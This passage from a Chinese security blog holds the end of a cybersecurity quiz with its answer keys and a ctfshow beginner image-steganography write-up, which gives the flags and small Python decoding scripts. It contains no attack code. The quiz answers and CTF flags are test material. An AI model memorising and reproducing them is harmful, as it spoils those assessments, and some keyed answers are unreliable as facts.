Access<br>B、IEC60870-5-101<br>C、IEC60870-5-104<br>D、IEC 62850<br>标准答案：D<br>17、根据系统所采用的安全策略及所具备的安全功能，TCSEC将系统分为()类共()个安全等级<br>A、3 6<br>B、4 6<br>C、4 7<br>D、6 8<br>标准答案：C<br>18、现场评测一般从几个方面出发,分别是<br>A、四个方面：访谈、文档审查、配置检查、实地考察<br>B、五个方面：访谈、文档审查、配置检查、工具测试和实地察看<br>C、三个方面：文档审查、配置检查、实地考察<br>D、六个方面：访谈、文档审查、配置检查、工具测试、实地察看，人员测试<br>标准答案：B<br>19、在传统的信息系统安全领域中，我们将安全的三种基本属性简称为CIA，以下哪一个选项不属于安全的三种基本属性<br>A、实时性<br>B、完整性<br>C、保密性<br>D、可用性<br>标准答案：A<br>20、第四级信息系统抽查不包括哪项<br>A、介质的存放环境<br>B、全部应用系统<br>C、与本单位有关的企业<br>D、主要服务器<br>标准答案：C<br>21、可能给系统造成影响或者破坏的人包括（）<br>A、黑客和跨客<br>B、只有黑客<br>C、只有跨客<br>D、所有网络与信息系统使用者<br>标准答案：D<br>22、工业控制组件中，漏洞最多的是哪几种<br>A、工业交换机和通用软件<br>B、PLC和SCADA/HMI<br>C、OPC<br>D、工业网关<br>标准答案：B<br>23、()是网络社会中社会工程学直接用于攻击的表现之一。<br>A、SQL注入攻击的利用<br>B、利用同情、内疚和胁迫<br>C、口令破解中的社会工程学利用<br>D、网络攻击中的社会工程学利用<br>标准答案：B<br>24、与Stuxnet有一定的相似度， 都使用了相同的加密算法和密钥的病毒是？（）<br>A、震网病毒<br>B、毒区病毒<br>C、火炎病毒<br>D、Triton病毒<br>标准答案：B<br>25、工业控制系统中的人机交互界面设备由硬件和软件两部分组成。硬件包括处理器、显示单元、输入单元、通信接口等，其中是HMI核心的是（ ）<br>A、处理器<br>B、显示单元<br>C、输入单元<br>D、通信接口<br>标准答案：A<br>26、熊猫烧香病毒在哪一年爆发 ( )<br>A、2006<br>B、2007<br>C、2008<br>D、2009<br>标准答案：B<br>27、()是信息安全管理中，最需要进行管理的内容。<br>A、组织<br>B、人员<br>C、规则<br>D、目标<br>标准答案：D<br>28、工业互联网安全框架的防护措施视角不包括（）<br>A、异常清除<br>B、威胁防护<br>C、监测感知<br>D、处置恢复<br>标准答案：A<br>29、()是社会工程学在安全意识培训方面进行防御的措施之一。<br>A、构建完善的技术防御体系<br>B、定期在公司内部分享网络安全前沿技术<br>C、知道社会工程学攻击利用什么<br>D、有效的安全管理体系和操作<br>标准答案：C<br>30、安全信息系统中最重要的安全隐患是（）。<br>A、配置审查<br>B、临时账户管理<br>C、数据安全迁移<br>D、程序恢复<br>标准答案：A<br>31、由于服务器软件或者应用程序对用户输入文件名称的安全性验证不足，使得攻击者通HTTP请求和利用一些特殊字符就可以绕过服务器的访问限制，访问任意受限的其他文件，甚至执行系统命令的漏洞称为（ ）？<br>A、路径遍历漏洞<br>B、未授权访问漏洞<br>C、远程控制漏洞<br>D、远程代码执行漏洞<br>标准答案：A<br>32、下列哪一种是专门针对工业互联网的，以窃取信息为目标的木马病毒（）<br>A、Havex木马程序<br>B、毒区病毒（Duqu）<br>C、火焰病毒（Huoyan）<br>D、灰鸽子木马程序<br>标准答案：A<br>33、《网络安全法》第五十九条规定，网络运营者不履行网络安全保护义务的，最多处以（）罚款。<br>A、五万元<br>B、七万元<br>C、十万元<br>D、二十万元<br>标准答案：C<br>34、典型工业控制系统架构包括现场设备层、现场控制层、过程监控层等五个层次，其中可以实现对采集量进行调整和处理的是（ )<br>A、现场设备层<br>B、过程监控层<br>C、生产管理层<br>D、现场控制层<br>标准答案：D<br>35、关闭WIFI的自动连接功能可以防范( )<br>A、所有恶意攻击<br>B、假冒热点攻击<br>C、恶意代码<br>D、拒绝服务攻击<br>标准答案：B<br>36、下列关于分析与报告编制活动说法正确的是<br>A、应进行测评实施准备<br>B、应对测评工具接入点确定<br>C、必须对测评指导书开发<br>D、首先应进行单项测评结果判定<br>标准答案：D<br>37、1949年()发表了《保密系统的通信理论》，奠定了现代密码学的基础。<br>A、Shannon<br>B、Ron Rivest<br>C、Adi Shanir<br>D、Leonard Adledleman<br>标准答案：A<br>38、下列任务与输出文档一一对应的是<br>A、测评对象确定:被测系统定级结果、测评指标<br>B、测评内容确定:被测系统的整体结构、边界、网络区域、重要节点、测评对象等<br>C、测评方案编制：各测评对象的测评内容及方法<br>D、测评指标确定：被测系统定级结果、测评指标<br>标准答案：D<br>39、由SANS公司的研究员在2015年8月发表的一份白皮书《网络安全滑动标尺模型》中建立的网络安全滑动标尺模型包含五大类别，分别为基础架构、被动防御、积极防御、威胁情报和反制攻击，其中具有消耗攻击资源，缩小攻击面特点的是（ ）<br>A、被动防御<br>B、积极防御<br>C、威胁情报<br>D、反制攻击<br>标准答案：A<br>40、互联网出口必须向公司信息化主管部门进行（）后方可使用<br>A、备案审批<br>B、申请<br>C、说明<br>D、报备<br>标准答案：A<br>41、以下哪项不属于防止口令猜测的措施（）<br>A、严格限定从一个给定的终端进行非法认证的次数<br>B、确保口令不在终端再现<br>C、防止用户使用太短的口令<br>D、使用机器产生的口令<br>标准答案：B<br>42、已运营（运行）的第二级以上信息系统，应当在安全保护等级确定后几日内到公安部办理手续<br>A、20日<br>B、30日<br>C、60日<br>D、45日<br>标准答案：B<br>43、工业互联网系统对社会经济、环境、人员安全的巨大影响，对于一般信息系统更加强调它的RAMS属性，（）不属于RAMS属性<br>A、可靠性<br>B、可维护性<br>C、可持续性<br>D、安全性<br>标准答案：C<br>44、工业控制系统漏洞被不法分子所利用往往会给企业带来各种损失，其中路径遍历漏洞就 属于高危漏洞其主要的特征有（）<br>A、由于需要安全配置或权限认证的地址、授权页面等存在一定的缺陷、导致其他用户可以直接访问，从而引发重要权限可被操作，数据库，网站目录等敏感信息泄露<br>B、由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令<br>C、由于程序员在开发用户和数据库交换的系统时没有对用户输入的字符串进行过滤、转义、限制和处理不严谨，导致用户可以通过输入精心构造的字符去非法获取数据库中的信息<br>D、由于服务器软件或者应用程序对用户输入文件名称的安全性验证不足<br>标准答案：D<br>45、目前已公开的案例中勒索病毒对工业系统的威胁还停留在（ ）勒索阶段。<br>A、物理攻击<br>B、加密文件<br>C、窃取机密<br>D、锁定设备<br>标准答案：B<br>46、（）是《工业互联网安全框架》所提出的网络安全<br>A、标识解析系统安全<br>B、工厂外部数据安全<br>C、工厂外部网络安全<br>D、工厂内部网络安全<br>标准答案：B<br>二、多项选择题<br>1、以下哪些属于PE文件保护技术？<br>A、PE完整性检测<br>B、注册表监控<br>C、PE文件访问权限保护<br>D、加壳保护<br>标准答案：ABCD<br>2、为保护工业大数据安全搭建的统一数据安全管理系统，创造了面向数据的安全管理体系框架。平台架构的最底层和最高层分别为（ ）（注意选项顺序）<br>A、敏感数据隔离交互层<br>B、数据脱敏层<br>C、数据分析层<br>D、数据加固层<br>标准答案：CD<br>3、在等级测评过程中可以规避风险的措施是：<br>A、签署委托测评协议<br>B、口头上达成保密协议<br>C、现场测评工作风险的规避<br>D、测评现场还原<br>标准答案：ACD<br>4、等级测评有几个测评过程,有：<br>A、测评准备活动<br>B、方案编制活动<br>C、现场测评活动<br>D、报告编制活动<br>标准答案：ABCD<br>5、保护企业网络的有效措施是？<br>A、为设备提供安全认证证书<br>B、部署SSL证书<br>C、为软件进行代码签名证书<br>D、为员工通讯邮箱部署电子邮件证书<br>标准答案：BCD<br>6、企业内部的信息管理安全风险有：<br>A、文件打印、传真风险<br>B、上网行为风险<br>C、病毒和木马风险<br>D、用户密码风险<br>标准答案：ABD<br>7、火灾自动报警、自动灭火系统部署应注意（）。<br>A、避开可能招致电磁干扰的区域或设备<br>B、具有不间断的专用消防电源<br>C、留备用电源<br>D、具有自动和手动两种触发装置<br>标准答案：ABCD<br>8、按照秘密、机密、绝密三级的不同要求，结合系统实际进行方案设计，实施分级保护，其保护水平总体上不低于国家信息安全等级保护<br>A、第二级、第四级、第五级<br>B、第三级<br>C、第三级、第四级、第五级<br>D、第四级<br>标准答案：C<br>9、数字水印有哪些特征（）？<br>A、不需要带外传输<br>B、透明性<br>C、鲁棒性<br>D、单一性<br>标准答案：ABC<br>10、用户的个人行为该怎样保证操作系统的安全？<br>A、定期进行系统更新<br>B、定期优化系统，清理注册表、垃圾文件等<br>C、禁用和关闭不常用的服务和端口<br>D、定期安装最新的系统更新程序和漏洞补丁<br>标准答案：ABCD<br>11、非对称密码一般要求(),()<br>A、加密解密使用相同密钥<br>B、加密解密使用不同密钥<br>C、发送方拥有加密或解密密钥，接收方拥有另一个密钥<br>D、收发双方必须共享密钥<br>标准答案：BC<br>12、密码系统包括(),(),()和密码算法<br>A、通信机制<br>B、密钥空间<br>C、明文空间<br>D、密文空间<br>标准答案：BCD<br>13、我们可以采取以下哪些措施用于防范口令攻击？<br>A、设置的口令尽可能复杂，使用数字、字母、特殊符号组成<br>B、选择一个具有很强安全性的复杂口令，在所有系统都使用它作为认证手段<br>C、定期更改口令<br>D、输入口令时确保周围没有其他人偷窥<br>标准答案：ACD<br>14、工业控制系统因受其生产环境所限，补丁漏洞的存在就算是已知也未必能够修复，其中（）导致了工业控制系统中策略和程序脆弱性<br>A、缺乏针对工业控制网络的特定安全策略<br>B、操作系统及应用的软件补丁未经过测试<br>C、缺乏安全架构和设计<br>D、缺乏安全审计<br>标准答案：ACD<br>15、信息系统的安全技术体系架构包括(),(),()应用和数据等几个方面<br>A、物理<br>B、人员<br>C、网络<br>D、系统<br>标准答案：ACD<br>16、现场测评活动的主要任务包括：<br>A、现场测评<br>B、现场测评准备<br>C、结果记录<br>D、结果确认和资料归还<br>标准答案：ABCD<br>17、以下哪些选项属于权限管理四项基本原则？<br>A、纵深<br>B、累加<br>C、拒绝优于允许<br>D、继承性<br>标准答案：BCD<br>18、为什么信息系统杀毒软件不适用于工业生产环境<br>A、信息系统杀毒软件需要定期更新病毒库等，无法适应工业连续生产的要求<br>B、信息系统杀毒软件对CPU和内存占用较高，无法适应工业生产环境的“可用性”要求<br>C、信息系统杀毒软件和工业软件存在兼容性问题<br>D、信息系统杀毒软件所带来的费用高昂<br>标准答案：ABC<br>19、测评活动的主要内容有<br>A、工具和表单准备<br>B、信息收集和分析<br>C、测评准备活动输出文档<br>D、项目启动<br>标准答案：ABCD<br>20、个人信息中的网络身份标识信息包括<br>A、硬件序列号<br>B、IP地址<br>C、用户个人数字证书<br>D、系统编号<br>标准答案：BCD<br>21、保障企业信息在存储传输过程中的(),(),()和不可抵赖性，是网络安全的目标之一。<br>A、全面性<br>B、完整性<br>C、合法性<br>D、保密性<br>标准答案：BCD<br>22、工业控制系统因其特殊性以及对其稳定性的要求不能够经常更新系统，所以导致了工业控制系统漏洞百出，其中常见的漏洞类型有（）<br>A、拒绝服务漏洞<br>B、访问控制漏洞<br>C、信息泄露漏洞<br>D、路径遍历漏洞<br>标准答案：ABCD<br>23、《网络安全法》的意义包括（）。<br>A、落实党中央决策部署的重要举措<br>B、维护网络安全的客观需要<br>C、维护民众切身利益的必然要求<br>D、参与互联网国际竞争和国际治理的必然选择<br>标准答案：ABCD<br>24、《信息系统等级保护安全设计技术要求》要求(),(),()和安全管理中心<br>A、安全计算环境<br>B、安全区域边界<br>C、安全通信网络<br>D、安全运营中心<br>标准答案：ABC<br>25、测评指标在技术/管理层面包括：<br>A、安全技术<br>B、人员安全意识<br>C、安全漏洞<br>D、安全管理<br>标准答案：AD<br>26、以下哪些是密码误用的例子<br>A、VPN配置策略不当<br>B、SSL使用无效证书，客户端存在证书校验问题<br>C、Android应用依赖第三方函数库导致各种密码学误用问题<br>D、在大部分嵌入式设备中，唯一的熵源只能是中断事件，熵源不足，影响随机数产生的安全性<br>标准答案：ABCD<br>27、网络运营者包括（）。<br>A、网络所有者<br>B、网络管理者<br>C、网络使用者<br>D、网络服务提供者<br>标准答案：ABD<br>28、零信任安全架构的理念可简单概括为（ )<br>A、要始终假设网络充满威胁，外部和内部威胁每时每刻都充斥着网络<br>B、不能仅仅依靠网络位置来建立信任关系<br>C、所有用户、设备和网络流量都应该被认证和授权<br>D、访问控制策略应该动态地、基于尽量多的数据源进行计算和评估<br>标准答案：ABCD<br>29、入侵检测系统的功能包含以下哪些选项？<br>A、过滤非法数据包<br>B、监视通信数据流<br>C、捕获可疑的网络行为<br>D、生成安全审计报告<br>标准答案：BCD<br>30、态势感知层产品处于产品结构的顶层，其核心能力是（ ）<br>A、集中管控<br>B、情报搜集<br>C、数据高级分析<br>D、数据采集<br>标准答案：BC<br>三、判断题<br>1、个人信息保存中个人信息控制者传输和存储敏感信息时，应采用加密等安全措施。<br>A、正确<br>B、错误<br>标准答案：A<br>2、计算机场地在正常情况下温度保持在18 - 28摄氏度。（）<br>A、正确<br>B、错误<br>标准答案：A<br>3、DNS属于应用层协议，既可以使用TCP协议，又可以使用UDP协议。<br>A、正确<br>B、错误<br>标准答案：A<br>4、数字签名过程中，先对消息加密，再对加密消息计算散列值并附加在消息之后。<br>A、正确<br>B、错误<br>标准答案：B<br>5、数据安全的保密性就是指，数据仅能被应该知悉的用户或实体读取和理解，其他实体不能读取数据或理解数据的含义（）。<br>A、正确<br>B、错误<br>标准答案：A<br>6、网络安全滑动标尺模型需要按照从左到右的顺序建设，其中被动防御和积极防御均需要人员的介入。（ ）<br>A、正确<br>B、错误<br>标准答案：B<br>7、基于主机的数据备份，该备份方式是将存储设备直接接在云主机上，而且还为其他服务器提供数据备份服务。<br>A、正确<br>B、错误<br>标准答案：B<br>8、在多层密钥体系中，一旦下层密钥泄露，上层密钥的安全性会荡然无存。（）<br>A、正确<br>B、错误<br>标准答案：B<br>9、基于威胁情报的工业威胁检测技术，对于受害目标及攻击源头的精准定位并不能产生较理想的效果。<br>A、正确<br>B、错误<br>标准答案：B<br>10、安全风险评估是信息安全等级保护建设的重要科学方法之一，可以运用到等级保护周期的系统定级、安全实施和安全运维等阶段。<br>A、正确<br>B、错误<br>标准答案：A<br>11、基于用户数据安全的保护，如果是重要的数据，可进行异地存储。<br>A、正确<br>B、错误<br>标准答案：A<br>12、由于工业控制系统中传输的数据通常是指令和采集的原始数据，而且多为实时数据，因此相对于完整性和可用性而言，对保密性要求最高。<br>A、正确<br>B、错误<br>标准答案：B<br>13、工业安全检查评估工具多为便携式设备，带有高清显示屏幕，且只需接入镜像流量即可，无须复杂配置。使用在线旁路部署方式，采用主动模式检查。（ ）<br>A、正确<br>B、错误<br>标准答案：B<br>14、《网络安全法》为整套的法规、规章预留了接口。<br>A、正确<br>B、错误<br>标准答案：A<br>15、容灾，就是减少灾难事件发生的可能性以及限制灾难对关键业务流程所造成的影响的一整套行为（）。<br>A、正确<br>B、错误<br>标准答案：A<br>16、关于测评准备活动中信息收集与分析任务的输出文档为填好的调查表格和各种与被测信息系统相关的资料。<br>A、正确<br>B、错误<br>标准答案：A<br>17、通过做好必要的分隔管控工作可以减少工业控制系统在接入互联网后被攻击的风险。（ ）<br>A、正确<br>B、错误<br>标准答案：A<br>18、工业互联网是连接I业全系统、全产业链、全价值链，支撑工业智能化发展的关键基础设施，是互联网从消费领域向生产领域、从虚拟经济向实体经济拓展的核心载体。（ ）<br>A、正确<br>B、错误<br>标准答案：A<br>19、造成工业控制系统暴露的主要原因之一是“商业网络”和“工业网络”的不断融合。（ ）<br>A、正确<br>B、错误<br>标准答案：A<br>20、在笔记本电脑感染勒索病毒后进行物理隔离断网操作，拔掉网线、禁用网卡即可。（ ）<br>A、正确<br>B、错误<br>标准答案：B<br>21、针对工业控制系统的攻击，攻击者的主要目的是获取商业情报、流程工艺，进行远程控制或者恶意破坏。（ ）<br>A、正确<br>B、错误<br>标准答案：A<br>22、第三方公司人员到公司洽谈业务，期间向您要公司无线网络的账号密码，您直接给他一个公用的账号密码。<br>A、正确<br>B、错误<br>标准答案：B<br>23、等级保护基本要求中的三级主机安全要求：增加对登录失败、安全传输、口令复杂度等要求，增加特权分离要求，增加审计记录保护要求，增加补丁及时更新要求，增加软件统一管理要求，增加单个业务应用使用系统资源的限制要求。<br>A、正确<br>B、错误<br>标准答案：B<br>24、高中低位能力安全产品体系中，安全运营层的核心能力是情报搜集和数据高级分析。<br>A、正确<br>B、错误<br>标准答案：B</p><hr><p>附上技能赛签到的一些题</p><p>在数据库系统中， <strong>口令保护</strong> 是信息系统的第一道屏障。</p><p>为了防止物理上取走数据库而采取的加强数据库安全的方法是 <strong>数据库加密</strong> 。</p><p>发生 <strong>介质故障</strong> 后，磁盘上的物理数据和日志文件被破坏，这是最严重的一种故障，恢复方法是重装数据库，然后重做已完成的事务。</p><p>在数据库的安全评估过程中，下面那项是指系统能够对付各种可能的攻击的能力。    <strong>可行性</strong></p><p>数据库访问控制策略中， <strong>只需策略</strong> 是只让用户得到有相应权限的信息，这些信息恰到可以让用户完成自己的工作，其他的权利一律不给。</p><p>数据库的 <strong>安全策略</strong> 是指如何组织、管理、保护和处理敏感信息的指导思想。它包括安全管理策略、访问控制策略和信息控制策略。</p><p>数据库的加密方法中，采用 <strong>库外加密</strong> ，则密钥管理较为简单，只需借用文件加密的密钥管理方法。</p><p>在下面的加密方法中，哪个加解密的效率最低： <strong>元素加密</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红明谷杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-Misc入门</title>
      <link href="2021/03/29/ctfshow-Misc%E5%85%A5%E9%97%A8/"/>
      <url>2021/03/29/ctfshow-Misc%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>此系列为Misc入门图片篇，不定期更新；<br>目的是介绍 Misc 方向中与图片相关的常见出题点；<br>题目按照知识点分类，并尽量保证难度为入门水平；<br> 大部分题目仅涉及单一知识点，但可能有多种解法；<br>找到flag并不困难，关键是了解每一题背后的原理；<br>藏在哪？为什么可以这样藏？请多考虑这两个问题；<br>才疏学浅，人菜手残，若有错漏之处，还望指出；<br> 希望能对刚接触 Misc 方向的朋友有所帮助。  </p></blockquote><h1 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>图片即是flag：ctfshow{22f1fb91fc4169f1c9411ce632a0ed8d}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc1.png"></p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>010打开发现是张png图片，于是改后缀为png即可获取flag：ctfshow{6f66202f21ad22a2a19520cdd3f69e7b}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc2.png"></p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>醉了呀！bpg这都是什么远古图片呀~<br>全网就一个软件能打开它（bpgviewer；打开即可获得flag：ctfshow{aade771916df7cde3009c0e631f9910d}</p><p><a href="https://pan.baidu.com/s/1jiLh2ECc2v_xafBAHgaHYg"><strong>附件</strong></a>（提取码：lk1b）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/99778520112456.png"></p><h2 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h2><p>拼接起来就是flag：ctfshow{4314e2b15ad9a960e7d9d8fc2ff902da}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/55.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4155526497885.png"></p><h1 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h1><h2 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h2><p>010打开划到底部发现flag：ctfshow{2a476b4011805f1a8e4b906c8f84083e}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/R%7DV83GT@6~IX9TE7$Z$$2%7DQ.png"></p><h2 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h2><p>010打开直接搜ctfshow就能得到flag：ctfshow{d5e937aefb091d38e70d927b80e1e2ea}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/41254148526896255.png"></p><h2 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h2><blockquote><p>flag在图片文件信息中。</p></blockquote><p>直接换成txt打开Ctrl+F5搜ctfshow得到flag：ctfshow{c5e77c9c289275e3f307362e1ed86bb7}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/44422144557587.png"></p><h2 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h2><blockquote><p>flag在图片文件中图片文件中。</p></blockquote><p>直接上来就是一通binwalk、foremost得到flag：ctfshow{1df0a9a3f709a2605803664b55783687}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4865589552.png"></p><h2 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h2><blockquote><p>flag在图片块里。</p></blockquote><p>图片块==数据块；又是直接010打开搜ctfshow就能得到flag：ctfshow{5c5e819508a3ab1fd823f11e83e93c75}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/999845862968899.png"></p><h2 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h2><blockquote><p>flag在图片数据里。</p></blockquote><p>010打开检测发现有个短的idat块有异常</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/01022515564988.png"></p><p>接着就是直接用idat组合成另一张图片，使用zlib进行压缩，跑下脚本得到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63746673686f777b33353332353234323461633639636236346636343337363838353161633739307d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/jio55123468755.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">IDAT = <span class="string">&quot;789C4B2E492BCEC82FAF363635363235323132494C36B34C4E3233493333313637B3B030354C4C36B734A8050009960BD1&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>16进制转一下即可得到flag：ctfshow{353252424ac69cb64f643768851ac790}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/554845251548546.png"></p><h2 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h2><blockquote><p>flag在另一张图里。</p></blockquote><p>删掉第一个idat即可得到flag：ctfshow{44620176948fa759d3eeafeac99f1ce9}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1112385467755555.png"></p><h2 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h2><blockquote><p>flag在另一张图里。</p></blockquote><p>同上，不过这里得把前八个idat块都删掉保存就能得到flag：ctfshow{10ea26425dd4708f7da7a13c8e256a73}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/122222225414177.png"></p><h2 id="misc13"><a href="#misc13" class="headerlink" title="misc13"></a>misc13</h2><blockquote><p>flag位置在图片末尾。</p></blockquote><p>010打开按提示划到底部发现了如下疑似flag的信息</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/131413520666.png"></p><p>复制粘贴出16进制文本跑下脚本得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;631A74B96685738668AA6F4B77B07B216114655336A5655434343678632534DD38EF66AB37103395391F628237BA6545627C3254647E313A64E465F136FA65F5341E3107321D665438F1333239E9616C7D&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">4</span>):</span><br><span class="line">    flag += s[i]</span><br><span class="line">    flag += s[i+<span class="number">1</span>]</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#63746673686F777B61653665343663343866373339623765623264316465366534313266383339617D</span></span><br></pre></td></tr></table></figure><p>16进制转下得到flag：ctfshow{ae6e3ea48f518b7e42d7de6f412f839a}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/131313555123.png"></p><h2 id="misc14"><a href="#misc14" class="headerlink" title="misc14"></a>misc14</h2><blockquote><p>flag在那张图里。</p></blockquote><p>010打开发现有张图片</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/141452052014666.png"></p><p>于是新建一个将其复制粘贴保存得到flag：ctfshow{ce520f767fc465b0787cdb936363e694}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc14deflag.jpg"></p><h2 id="misc15"><a href="#misc15" class="headerlink" title="misc15"></a>misc15</h2><blockquote><p>flag被跳过去了。</p></blockquote><p>010打开就看到了flag：ctfshow{fbe7bb657397e6e0a6adea3e40265425}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1515151515151515515.png"></p><h2 id="misc16"><a href="#misc16" class="headerlink" title="misc16"></a>misc16</h2><blockquote><p>flag在图片数据里。</p></blockquote><p>binwalk分离一下即可得到flag：ctfshow{a7e32f131c011290a62476ae77190b52}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210331161130247.png"></p><h2 id="misc17"><a href="#misc17" class="headerlink" title="misc17"></a>misc17</h2><blockquote><p>flag在图片数据里。</p></blockquote><p>binwalk发现有个破损的包，接着zsteg发现了隐藏的数据，于是我们将其提取出来</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/177115114156156.png"></p><p>最后binwalk分离得到flag：ctfshow{0fe61fc42e8bbe55b9257d251749ae45}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3143535616165152.png"></p><h2 id="misc18"><a href="#misc18" class="headerlink" title="misc18"></a>misc18</h2><blockquote><p><strong>flag在标题、作者、照相机和镜头型号里。</strong></p></blockquote><p>根据提示在详细信息中找到并拼接得到flag：ctfshow{325d60c208f728ac17e5f02d4cf5a839}</p><h2 id="misc19"><a href="#misc19" class="headerlink" title="misc19"></a>misc19</h2><blockquote><p>flag在主机上的文档名里。</p></blockquote><p>根据提示我百度找到了个<a href="https://exif.tuchong.com/view/10702093/"><strong>在线工具</strong></a>查的图片信息进而得到flag：ctfshow{dfdcf08038cd446a5eb50782f8d3605d}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/191919919191645.png"></p><h2 id="misc20"><a href="#misc20" class="headerlink" title="misc20"></a>misc20</h2><blockquote><p>flag在评论里。</p></blockquote><p>同上利用<a href="https://exif.tuchong.com/view/10702093/"><strong>在线工具</strong></a>查到评论信息</p><p>谐音梗！！西替爱抚秀 = ctfshow！！所以flag是ctfshow{c97964b1aecf06e1d79c21ddad593e42}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/221515251000.png"></p><h2 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21</h2><blockquote><p>flag在序号里。</p></blockquote><p>同上找到和序号相关的信息</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2185968941986541698416.png"></p><p>hex后发现hex(X&amp;Ys)；也就是还需要X分辨率、Y分辨率、X定位、Y定位</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/21332131221113223.png"></p><p>最后将那四组数据分别转成16进制拼接并套上ctfshow{}得到flag：ctfshow{e8a221498d5c073b4084eb51b1a1686d}</p><h2 id="misc22"><a href="#misc22" class="headerlink" title="misc22"></a>misc22</h2><blockquote><p>flag在图片里。</p></blockquote><p><a href="https://www.beijing-time.org/shijianchuo/"><strong>参考文章</strong></a>了解一下app0 app1（此位置允许保存一个原图的缩略图</p><p>010打开对照结构正常写在app那几个段得到flag：ctfshow{dbf7d3f84b0125e833dfd3o80820a129}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/ctfshowmiscmisc22flag.jpg"></p><p>眼睛都要看瞎了but提交还是一直不对..</p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/555552021-03-31205448.png"></p><p>嘤嘤嘤 ~ 